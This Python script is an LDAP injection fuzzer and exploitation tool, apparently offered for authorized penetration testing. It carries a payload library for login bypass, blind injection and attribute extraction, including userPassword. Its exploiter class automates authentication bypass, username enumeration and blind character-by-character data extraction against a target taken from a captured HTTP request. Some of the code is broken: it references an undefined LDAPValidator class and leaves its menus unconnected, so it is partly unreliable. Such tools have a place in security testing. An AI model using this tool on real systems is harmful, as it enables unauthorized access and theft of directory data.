#!/usr/bin/env python3
# =============================================================================
# LDAP Injection Fuzzer - Advanced Security Testing Framework
# =============================================================================
#
# Author: Keith Pachulski
# Company: Red Cell Security, LLC
# Email: keith@redcellsecurity.org
# Website: www.redcellsecurity.org
#
# Copyright (c) 2025 Keith Pachulski. All rights reserved.
#
# License: This software is licensed under the MIT License.
#          You are free to use, modify, and distribute this software
#          in accordance with the terms of the license.
#
# Purpose: This script is part of an advanced LDAP injection testing framework
#          designed for authorized security assessments and penetration testing.
#          It automates the discovery of LDAP injection vulnerabilities through
#          intelligent fuzzing, response analysis, and anomaly detection across
#          multiple attack vectors including authentication bypass, blind injection,
#          and error-based exploitation techniques.

import requests
import urllib.parse
import argparse
import re
import time
from typing import Dict, List, Tuple
from collections import defaultdict
import statistics

# Suppress SSL warnings for testing environments
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class LDAPPayloadLibrary:
    """LDAP injection payload collection"""

    @staticmethod
    def get_all_payloads() -> Dict[str, List[str]]:
        return {
            "authentication_bypass": [
                "*",
                "*)(",
                "*)(objectClass=*",
                "*)(uid=*)",
                "*)(|(uid=*))",
                "admin)(&",
                "admin*)((|userPassword=*)",
                "*)(cn=*))(|(cn=*",
            ],
            "blind_injection": [
                "*)(objectClass=*))(&(objectClass=void",
                "*)(|(objectClass=*)(objectClass=void))(&(objectClass=*",
                "*)(uid=*))(|(uid=*",
                "*)(&(objectClass=*)(objectClass=void)(&(objectClass=*",
            ],
            "error_based": [
                "*)((|(",
                "*))%00",
                "*()|&'",
                "admin*)(|(password=*))",
                "*)(mail=*))((|cn=*",
            ],
            "attribute_extraction": [
                "*)(uid=*))(|(uid=*",
                "*)(cn=*))(|(cn=*",
                "*)(mail=*))(|(mail=*",
                "*)(sAMAccountName=*))(|(sAMAccountName=*",
                "*)(userPassword=*))(|(userPassword=*",
            ],
            "logic_operators": [
                "*)(!(objectClass=*))",
                "*)(!(&(objectClass=*)))",
                "*)(|(&))",
                "*)(|(uid=admin)(uid=test))",
            ],
            "wildcard_patterns": [
                "admin*",
                "*admin*",
                "a*",
                "adm*",
                "*)(cn=a*",
            ],
            "time_based": [
                "*)(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*",
                "*)(&(objectClass=*" * 50,
            ],
            "null_byte": [
                "admin\x00",
                "*\x00*",
                "*)\x00(objectClass=*",
            ],
            "encoding_bypass": [
                "%2a",
                "%29%28%7c",
                "\x2a\x29\x28\x7c",
            ],
        }

    @staticmethod
    def get_flat_list() -> List[str]:
        """Get all payloads as a flat list"""
        all_payloads = []
        for category, payloads in LDAPPayloadLibrary.get_all_payloads().items():
            all_payloads.extend(payloads)
        return all_payloads

class HTTPRequestParser:
    """Parse raw HTTP requests from files"""

    @staticmethod
    def parse_file(filepath: str) -> Tuple[str, Dict, Dict, Dict, str]:
        """
        Parse raw HTTP request file
        Returns: (url, headers, cookies, params, method)
        """
        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read()

        # Split headers and body
        parts = content.split('\n\n', 1)
        header_section = parts[0]
        body = parts[1] if len(parts) > 1 else ""

        lines = header_section.split('\n')

        # Parse request line
        request_line = lines[0]
        method_match = re.match(r'(\w+)\s+([^\s]+)\s+HTTP', request_line)
        if not method_match:
            raise ValueError("Invalid HTTP request format")

        method = method_match.group(1)
        path = method_match.group(2)

        # Parse headers
        headers = {}
        cookies = {}
        host = ""

        for line in lines[1:]:
            if ':' not in line:
                continue

            key, value = line.split(':', 1)
            key = key.strip()
            value = value.strip()

            if key.lower() == 'host':
                host = value
            elif key.lower() == 'cookie':
                # Parse cookies
                for cookie in value.split(';'):
                    if '=' in cookie:
                        c_name, c_value = cookie.strip().split('=', 1)
                        cookies[c_name] = c_value
            else:
                headers[key] = value

        # Construct full URL - handle proxy-style vs normal requests
        # Check if path is already a full URL (proxy-style request)
        if path.startswith('http://') or path.startswith('https://'):
            # It's a full URL - use it directly, just clean it up
            url = path.split(';')[0].split('?')[0]
        else:
            # Normal relative path - construct URL from host header
            scheme = "https"  # Default to HTTPS
            clean_path = path.split(';')[0].split('?')[0]
            url = f"{scheme}://{host}{clean_path}"

        # Parse POST parameters from body
        params = {}
        if body:
            # URL decode the body
            body = body.strip()
            for param in body.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    # URL decode
                    key = urllib.parse.unquote(key)
                    value = urllib.parse.unquote(value)
                    params[key] = value

        return url, headers, cookies, params, method

class ResponseAnalyzer:
    """Analyze responses to detect successful injections"""

    def __init__(self):
        self.baseline_length = None
        self.baseline_status = None
        self.response_lengths = []
        self.response_times = []

    def analyze(self, response, response_time: float, payload: str) -> Dict:
        """
        Analyze response for injection indicators
        Returns dict with detection results
        """
        findings = {
            'payload': payload,
            'status_code': response.status_code,
            'length': len(response.text),
            'time': response_time,
            'anomalies': []
        }

        # Set baseline from first response
        if self.baseline_length is None:
            self.baseline_length = len(response.text)
            self.baseline_status = response.status_code
            return findings

        # Track lengths and times
        self.response_lengths.append(len(response.text))
        self.response_times.append(response_time)

        # Status code change
        if response.status_code != self.baseline_status:
            findings['anomalies'].append(f"Status changed: {self.baseline_status} -> {response.status_code}")

        # Significant length change (>10% difference)
        length_diff = abs(len(response.text) - self.baseline_length)
        if length_diff > (self.baseline_length * 0.1):
            findings['anomalies'].append(f"Length diff: {length_diff} bytes ({length_diff/self.baseline_length*100:.1f}%)")

        # Error patterns in response
        error_patterns = [
            r'ldap[_\s]*error',
            r'invalid[_\s]*dn',
            r'search[_\s]*failed',
            r'bind[_\s]*failed',
            r'javax\.naming\.NamingException',
            r'LDAPException',
            r'bad[_\s]*search[_\s]*filter',
            r'invalid[_\s]*syntax',
        ]

        for pattern in error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                findings['anomalies'].append(f"Error pattern detected: {pattern}")
                break

        # Time-based detection (if significantly slower)
        if len(self.response_times) > 5:
            avg_time = statistics.mean(self.response_times[:-1])
            if response_time > (avg_time * 2):
                findings['anomalies'].append(f"Timing anomaly: {response_time:.2f}s (avg: {avg_time:.2f}s)")

        return findings


class LDAPFuzzer:
    """Main LDAP injection fuzzing engine"""

    def __init__(self, url: str, headers: Dict, cookies: Dict, params: Dict, method: str = "POST"):
        self.url = url
        self.headers = headers
        self.cookies = cookies
        self.base_params = params
        self.method = method
        self.analyzer = ResponseAnalyzer()

    def get_fuzzable_params(self) -> List[str]:
        """Return list of parameters that can be fuzzed"""
        return list(self.base_params.keys())

    def fuzz_parameter(self, param_name: str, payloads: List[str], verbose: bool = False):
        """Fuzz a single parameter with all payloads"""
        print(f"\n{'='*80}")
        print(f"[*] Fuzzing parameter: {param_name}")
        print(f"[*] Testing {len(payloads)} payloads")
        print(f"{'='*80}\n")

        interesting_findings = []

        for i, payload in enumerate(payloads, 1):
            # Create modified params
            test_params = self.base_params.copy()
            test_params[param_name] = payload

            # Make request
            start_time = time.time()
            try:
                response = requests.post(
                    self.url,
                    headers=self.headers,
                    cookies=self.cookies,
                    data=test_params,
                    verify=False,
                    timeout=10
                )
                response_time = time.time() - start_time

                # Analyze response
                analysis = self.analyzer.analyze(response, response_time, payload)

                # Display results
                status_indicator = "✓" if response.status_code == 200 else "✗"
                print(f"[{i:3d}/{len(payloads)}] {status_indicator} | Status: {analysis['status_code']} | "
                      f"Length: {analysis['length']:6d} | Time: {response_time:5.2f}s | Payload: {payload[:60]}")

                # Show anomalies
                if analysis['anomalies']:
                    print(f"         └─> INTERESTING: {', '.join(analysis['anomalies'])}")
                    interesting_findings.append(analysis)

                elif verbose:
                    # Show response snippet in verbose mode
                    snippet = response.text[:100].replace('\n', ' ')
                    print(f"         └─> Response: {snippet}...")

            except requests.exceptions.Timeout:
                print(f"[{i:3d}/{len(payloads)}] ⏱ | TIMEOUT after 10s | Payload: {payload[:60]}")
                interesting_findings.append({
                    'payload': payload,
                    'anomalies': ['Request timeout - possible time-based injection']
                })
            except Exception as e:
                print(f"[{i:3d}/{len(payloads)}] ✗ | ERROR: {str(e)[:50]} | Payload: {payload[:60]}")

            # Rate limiting
            time.sleep(0.1)

        # Summary
        print(f"\n{'='*80}")
        print(f"[*] Fuzzing complete for parameter: {param_name}")
        print(f"[*] Interesting findings: {len(interesting_findings)}")
        if interesting_findings:
            print(f"\n[!] SUMMARY OF INTERESTING PAYLOADS:")
            for finding in interesting_findings:
                print(f"    Payload: {finding['payload']}")
                print(f"    Anomalies: {', '.join(finding['anomalies'])}")
                print()
        print(f"{'='*80}\n")


class LDAPExploiter:
    """Exploit confirmed LDAP injection vulnerabilities"""

    def __init__(self, url: str, headers: Dict, cookies: Dict, params: Dict):
        self.url = url
        self.headers = headers
        self.cookies = cookies
        self.base_params = params

    def test_payload(self, param_name: str, payload: str, timeout: int = 10) -> Dict:
        """Test a single payload"""
        test_params = self.base_params.copy()
        test_params[param_name] = payload

        try:
            start = time.time()
            response = requests.post(
                self.url,
                headers=self.headers,
                cookies=self.cookies,
                data=test_params,
                verify=False,
                timeout=timeout
            )
            elapsed = time.time() - start

            return {
                'success': True,
                'status': response.status_code,
                'length': len(response.text),
                'time': elapsed,
                'response': response.text,
                'cookies': response.cookies.get_dict()
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }

    def authentication_bypass(self, param_name: str, password_param: str = None):
        """Attempt authentication bypass"""
        print(f"\n{'='*80}")
        print(f"[*] EXPLOITATION: Authentication Bypass")
        print(f"[*] Target Parameter: {param_name}")
        print(f"{'='*80}\n")

        bypass_payloads = [
            ("Wildcard bypass", "*"),
            ("Admin wildcard", "admin*"),
            ("OR true condition", "*)|(uid=*"),
            ("OR objectClass", "*)|(objectClass=*"),
            ("Complex OR", "*)(uid=*))(|(uid=*"),
            ("AND bypass", "*)(&(objectClass=*"),
            ("Null comparison", "*)|(cn=*))(&(cn=*"),
            ("Always true", "*)(|(objectClass=*)(objectClass=users))"),
        ]

        print("[*] Testing authentication bypass payloads...\n")

        # Get baseline failed login
        baseline = self.test_payload(param_name, "invalid_user_12345")
        print(f"[+] Baseline (failed login): Length={baseline['length']}, Status={baseline['status']}\n")

        successful_bypasses = []

        for label, payload in bypass_payloads:
            print(f"[*] Testing: {label:<30s}", end=" ", flush=True)
            result = self.test_payload(param_name, payload)

            if not result['success']:
                print(f"| ERROR: {result['error']}")
                continue

            # Check for successful authentication indicators
            length_diff = abs(result['length'] - baseline['length'])
            length_pct = (length_diff / baseline['length'] * 100) if baseline['length'] > 0 else 0

            # Look for success indicators
            success_indicators = []

            # Different response length
            if length_pct > 10:
                success_indicators.append(f"Length change: {length_pct:.1f}%")

            # Status code change
            if result['status'] != baseline['status']:
                success_indicators.append(f"Status: {baseline['status']}->{result['status']}")

            # Session cookie issued
            if result['cookies'] and len(result['cookies']) > len(baseline.get('cookies', {})):
                success_indicators.append("New session cookie")

            # Check response content for success patterns
            success_patterns = [
                'welcome', 'dashboard', 'logout', 'profile', 'home',
                'successfully', 'logged in', 'authentication successful',
                'redirecting', 'location.href'
            ]

            response_lower = result['response'].lower()
            for pattern in success_patterns:
                if pattern in response_lower and pattern not in baseline['response'].lower():
                    success_indicators.append(f"Pattern: '{pattern}'")
                    break

            # Check for redirect indicators
            if 'window.location' in result['response'] or 'redirect' in response_lower:
                if 'window.location' not in baseline['response']:
                    success_indicators.append("JavaScript redirect detected")

            if success_indicators:
                print(f"| SUCCESS INDICATORS: {', '.join(success_indicators)}")
                successful_bypasses.append({
                    'label': label,
                    'payload': payload,
                    'indicators': success_indicators,
                    'result': result
                })
            else:
                print(f"| Length: {result['length']}, Status: {result['status']}")

        # Summary
        print(f"\n{'='*80}")
        print(f"[*] BYPASS ATTEMPT SUMMARY")
        print(f"{'='*80}\n")

        if successful_bypasses:
            print(f"[+] POTENTIAL SUCCESSFUL BYPASSES: {len(successful_bypasses)}\n")

            for bypass in successful_bypasses:
                print(f"  [!] {bypass['label']}")
                print(f"      Payload: {bypass['payload']}")
                print(f"      Indicators: {', '.join(bypass['indicators'])}")
                print(f"      Status: {bypass['result']['status']}")
                print(f"      Length: {bypass['result']['length']}")
                print()

            # Save most promising bypass
            self._save_bypass_response(successful_bypasses[0], param_name)

            print(f"[!] EXPLOITATION SUCCESS")
            print(f"    Payload '{successful_bypasses[0]['payload']}' appears to bypass authentication")
            print(f"    Review saved response for confirmation of access")

        else:
            print(f"[-] No obvious authentication bypass detected")
            print(f"    Application may be vulnerable but requires manual verification")
            print(f"    Check for subtle changes in responses or application behavior")

        return successful_bypasses

    def enumerate_users(self, param_name: str):
        """Enumerate valid usernames using blind LDAP injection"""
        print(f"\n{'='*80}")
        print(f"[*] EXPLOITATION: Username Enumeration")
        print(f"[*] Using blind LDAP injection techniques")
        print(f"{'='*80}\n")

        # Common username patterns
        username_candidates = [
            'admin', 'administrator', 'root', 'user', 'test',
            'guest', 'operator', 'manager', 'supervisor', 'director',
            'system', 'support', 'helpdesk', 'service', 'backup'
        ]

        print("[*] Testing username existence...\n")

        # Baseline - non-existent user
        baseline = self.test_payload(param_name, "nonexistent_user_xyz123")
        print(f"[+] Baseline (invalid user): Length={baseline['length']}\n")

        valid_users = []

        for username in username_candidates:
            # LDAP payload to check if user exists
            # If user exists, LDAP query will be different
            payload = f"{username}*)({param_name.split(':')[-1]}={username}"

            result = self.test_payload(param_name, payload)

            if not result['success']:
                continue

            length_diff = abs(result['length'] - baseline['length'])
            length_pct = (length_diff / baseline['length'] * 100) if baseline['length'] > 0 else 0

            indicator = "[+]" if length_pct > 5 else "[-]"
            print(f"{indicator} {username:20s} | Length: {result['length']:6d} | Diff: {length_pct:5.1f}%")

            if length_pct > 5:
                valid_users.append({
                    'username': username,
                    'confidence': 'HIGH' if length_pct > 15 else 'MEDIUM',
                    'length_diff': length_diff
                })

            time.sleep(0.2)

        print(f"\n{'='*80}")
        print(f"[*] ENUMERATION RESULTS")
        print(f"{'='*80}\n")

        if valid_users:
            print(f"[+] POTENTIALLY VALID USERNAMES: {len(valid_users)}\n")
            for user in valid_users:
                print(f"  [!] {user['username']} (Confidence: {user['confidence']})")
            print(f"\n[+] These usernames show different response patterns")
            print(f"    Likely valid accounts in LDAP directory")
        else:
            print(f"[-] No definitive username enumeration")
            print(f"    Application may normalize responses")

        return valid_users

    def blind_data_extraction(self, param_name: str, attribute: str = 'cn'):
        """Extract data using boolean-based blind LDAP injection"""
        print(f"\n{'='*80}")
        print(f"[*] EXPLOITATION: Blind Data Extraction")
        print(f"[*] Target Attribute: {attribute}")
        print(f"{'='*80}\n")

        print("[*] Extracting attribute values using boolean blind injection...\n")

        # Character set for brute force
        charset = 'abcdefghijklmnopqrstuvwxyz0123456789_-.'

        # Get baseline responses for true/false conditions
        true_payload = f"*)({attribute}=*"
        false_payload = f"*)({attribute}=impossiblevalue123xyz"

        true_result = self.test_payload(param_name, true_payload)
        false_result = self.test_payload(param_name, false_payload)

        print(f"[+] True condition length: {true_result['length']}")
        print(f"[+] False condition length: {false_result['length']}")

        length_diff = abs(true_result['length'] - false_result['length'])

        if length_diff < 10:
            print(f"\n[-] Insufficient length difference ({length_diff} bytes)")
            print(f"    Blind extraction may not be reliable")
            return None

        print(f"[+] Detectable difference: {length_diff} bytes\n")
        print(f"[*] Starting character-by-character extraction...\n")

        extracted_values = []

        # Try to extract first few characters
        for prefix_len in range(1, 6):
            print(f"[*] Testing {prefix_len}-character prefixes...")

            found_prefix = None
            for char in charset:
                payload = f"*)({attribute}={char}*"
                result = self.test_payload(param_name, payload)

                # If response is similar to "true" condition, this character exists
                if abs(result['length'] - true_result['length']) < abs(result['length'] - false_result['length']):
                    found_prefix = char
                    print(f"    [+] Found starting character: '{char}'")
                    break

                time.sleep(0.1)

            if found_prefix:
                extracted_values.append(found_prefix)

                # Try to continue from this character
                for next_char in charset[:5]:  # Limit depth for demo
                    test_value = found_prefix + next_char
                    payload = f"*)({attribute}={test_value}*"
                    result = self.test_payload(param_name, payload)

                    if abs(result['length'] - true_result['length']) < abs(result['length'] - false_result['length']):
                        print(f"    [+] Extended to: '{test_value}'")
                        time.sleep(0.1)

            if not found_prefix:
                break

        print(f"\n{'='*80}")
        print(f"[*] EXTRACTION RESULTS")
        print(f"{'='*80}\n")

        if extracted_values:
            print(f"[+] Partial data extracted: {', '.join(extracted_values)}")
            print(f"    Full extraction would require automated brute force")
        else:
            print(f"[-] No data extracted")
            print(f"    May require different injection techniques")

        return extracted_values

    def _save_bypass_response(self, bypass_data: Dict, param_name: str):
        """Save successful bypass response for analysis"""
        filename = f"ldap_bypass_{param_name.replace(':', '_')}_{int(time.time())}.html"

        with open(filename, 'w') as f:
            f.write(f"<!-- LDAP Injection Bypass Response -->\n")
            f.write(f"<!-- Payload: {bypass_data['payload']} -->\n")
            f.write(f"<!-- Indicators: {', '.join(bypass_data['indicators'])} -->\n\n")
            f.write(bypass_data['result']['response'])

        print(f"[+] Bypass response saved to: {filename}")


def exploitation_menu(fuzzer: LDAPFuzzer, validator: LDAPValidator, param_name: str):
    """Interactive exploitation menu"""
    exploiter = LDAPExploiter(fuzzer.url, fuzzer.headers, fuzzer.cookies, fuzzer.base_params)

    while True:
        print(f"\n{'='*80}")
        print(f"[*] EXPLOITATION MENU")
        print(f"[*] Target Parameter: {param_name}")
        print(f"{'='*80}\n")

        print("[*] Available Exploits:\n")
        print("    1. Authentication Bypass")
        print("    2. Username Enumeration")
        print("    3. Blind Data Extraction")
        print("    4. Custom Payload Test")
        print("    0. Return to Validation Menu\n")

        try:
            choice = input("[?] Select exploit: ").strip()

            if choice == '0':
                break
            elif choice == '1':
                exploiter.authentication_bypass(param_name)
                input("\n[?] Press ENTER to continue...")
            elif choice == '2':
                exploiter.enumerate_users(param_name)
                input("\n[?] Press ENTER to continue...")
            elif choice == '3':
                attribute = input("[?] Enter LDAP attribute to extract (default: cn): ").strip() or 'cn'
                exploiter.blind_data_extraction(param_name, attribute)
                input("\n[?] Press ENTER to continue...")
            elif choice == '4':
                payload = input("[?] Enter custom payload: ").strip()
                if payload:
                    result = exploiter.test_payload(param_name, payload)
                    print(f"\n[+] Status: {result.get('status', 'ERROR')}")
                    print(f"[+] Length: {result.get('length', 0)}")
                    print(f"[+] Time: {result.get('time', 0):.3f}s")

                    if 'response' in result:
                        save = input("\n[?] Save response to file? (y/n): ").strip().lower()
                        if save == 'y':
                            filename = f"custom_payload_{int(time.time())}.html"
                            with open(filename, 'w') as f:
                                f.write(result['response'])
                            print(f"[+] Response saved to: {filename}")

                    input("\n[?] Press ENTER to continue...")

        except (ValueError, KeyError) as e:
            print(f"[!] Error: {e}")

def post_fuzzing_menu(fuzzer: LDAPFuzzer, findings: List[Dict]):
    """Interactive menu for validating and exploiting findings"""
    if not findings:
        print("\n[*] No interesting findings to validate.")
        return

    # Group findings by parameter
    param_findings = defaultdict(list)
    for finding in findings:
        param_findings[finding['parameter']].append(finding)

    while True:
        print(f"\n{'='*80}")
        print(f"[*] POST-FUZZING VALIDATION MENU")
        print(f"[*] Found {len(findings)} potential injection points across {len(param_findings)} parameters")
        print(f"{'='*80}\n")

        print("[*] Available Actions:\n")

        idx = 1
        param_menu = {}
        for param, param_finds in param_findings.items():
            print(f"    {idx}. Validate '{param}' ({len(param_finds)} findings)")
            param_menu[idx] = param
            idx += 1

        print(f"\n    {idx}. Enumerate LDAP Attributes (choose parameter)")
        enum_option = idx
        idx += 1

        print(f"    {idx}. Exploit Vulnerability (choose parameter)")
        exploit_option = idx
        idx += 1

        print(f"    {idx}. Run Full Validation on All Parameters")
        all_option = idx
        idx += 1

        print(f"    0. Exit to Main Menu\n")

        try:
            choice = input("[?] Select action: ").strip()

            if choice == '0':
                break

            choice_int = int(choice)

            if choice_int in param_menu:
                # Validate specific parameter
                param = param_menu[choice_int]
                validator = LDAPValidator(fuzzer.url, fuzzer.headers, fuzzer.cookies, fuzzer.base_params)
                validator.confirm_injection(param)
                input("\n[?] Press ENTER to continue...")

            elif choice_int == enum_option:
                # Choose parameter for enumeration
                print("\n[*] Select parameter for attribute enumeration:")
                for i, param in enumerate(param_menu.values(), 1):
                    print(f"    {i}. {param}")

                param_choice = int(input("\n[?] Select parameter: ").strip())
                if 1 <= param_choice <= len(param_menu):
                    param = list(param_menu.values())[param_choice - 1]
                    validator = LDAPValidator(fuzzer.url, fuzzer.headers, fuzzer.cookies, fuzzer.base_params)
                    validator.enumerate_attributes(param)
                    input("\n[?] Press ENTER to continue...")

            elif choice_int == exploit_option:
                # Choose parameter for exploitation
                print("\n[*] Select parameter to exploit:")
                for i, param in enumerate(param_menu.values(), 1):
                    print(f"    {i}. {param}")

                param_choice = int(input("\n[?] Select parameter: ").strip())
                if 1 <= param_choice <= len(param_menu):
                    param = list(param_menu.values())[param_choice - 1]
                    validator = LDAPValidator(fuzzer.url, fuzzer.headers, fuzzer.cookies, fuzzer.base_params)
                    exploitation_menu(fuzzer, validator, param)

            elif choice_int == all_option:
                # Run validation on all parameters
                for param in param_menu.values():
                    validator = LDAPValidator(fuzzer.url, fuzzer.headers, fuzzer.cookies, fuzzer.base_params)
                    validator.confirm_injection(param)
                    time.sleep(1)
                input("\n[?] Press ENTER to continue...")

        except (ValueError, KeyError):
            print("[!] Invalid selection. Try again.")

def select_parameters(available_params: List[str]) -> List[str]:
    """Interactive parameter selection"""
    print("\n[*] Available parameters to fuzz:")
    for i, param in enumerate(available_params, 1):
        print(f"    {i}. {param}")

    print(f"    {len(available_params) + 1}. ALL PARAMETERS")
    print(f"    0. EXIT")

    while True:
        try:
            choice = input("\n[?] Select parameter(s) to fuzz (comma-separated numbers or range): ").strip()

            if choice == '0':
                return []

            # Handle "all" option
            if str(len(available_params) + 1) in choice:
                return available_params

            # Parse selection
            selected = []
            for part in choice.split(','):
                part = part.strip()
                if '-' in part:
                    # Range selection
                    start, end = map(int, part.split('-'))
                    selected.extend(range(start, end + 1))
                else:
                    selected.append(int(part))

            # Convert to parameter names
            result = [available_params[i-1] for i in selected if 1 <= i <= len(available_params)]
            return result

        except (ValueError, IndexError):
            print("[!] Invalid selection. Try again.")


def main():
    parser = argparse.ArgumentParser(
        description='Advanced LDAP Injection Fuzzer',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Fuzz using request file
  python ldap_fuzzer.py -f request.txt

  # Fuzz specific parameter with verbose output
  python ldap_fuzzer.py -f request.txt -p login:userName -v

  # Use custom payload file
  python ldap_fuzzer.py -f request.txt --payloads custom_payloads.txt
        """
    )

    parser.add_argument('-f', '--file', required=True, help='File containing raw HTTP request')
    parser.add_argument('-p', '--param', help='Specific parameter to fuzz (skip interactive selection)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output (show response snippets)')
    parser.add_argument('--payloads', help='File containing custom payloads (one per line)')
    parser.add_argument('--delay', type=float, default=0.1, help='Delay between requests (seconds)')

    args = parser.parse_args()

    # Banner
    print("""
╔══════════════════════════════════════════════════════════════════════════╗
║                         LDAP Injection Fuzzer                            ║
╚══════════════════════════════════════════════════════════════════════════╝
    """)

    # Parse HTTP request file
    print(f"[*] Parsing request file: {args.file}")
    try:
        url, headers, cookies, params, method = HTTPRequestParser.parse_file(args.file)
        print(f"[+] Target URL: {url}")
        print(f"[+] Method: {method}")
        print(f"[+] Parameters found: {len(params)}")
        print(f"[+] Cookies: {len(cookies)}")
    except Exception as e:
        print(f"[!] Error parsing request file: {e}")
        return

    # Load payloads
    if args.payloads:
        print(f"[*] Loading custom payloads from: {args.payloads}")
        with open(args.payloads, 'r') as f:
            payloads = [line.strip() for line in f if line.strip()]
    else:
        print(f"[*] Using built-in LDAP injection payload library")
        payloads = LDAPPayloadLibrary.get_flat_list()

    print(f"[+] Loaded {len(payloads)} payloads")

    # Initialize fuzzer
    fuzzer = LDAPFuzzer(url, headers, cookies, params, method)

    # Select parameters to fuzz
    if args.param:
        if args.param not in params:
            print(f"[!] Parameter '{args.param}' not found in request")
            return
        params_to_fuzz = [args.param]
    else:
        params_to_fuzz = select_parameters(fuzzer.get_fuzzable_params())

    if not params_to_fuzz:
        print("[*] No parameters selected. Exiting.")
        return

    # Start fuzzing
    print(f"\n[*] Starting fuzzing campaign...")
    print(f"[*] Parameters to test: {', '.join(params_to_fuzz)}")

    input("\n[?] Press ENTER to start fuzzing...")

    for param in params_to_fuzz:
        fuzzer.fuzz_parameter(param, payloads, verbose=args.verbose)

        # Reset analyzer for next parameter
        fuzzer.analyzer = ResponseAnalyzer()

    print("\n[*] Fuzzing campaign complete!")


if __name__ == "__main__":
    main()
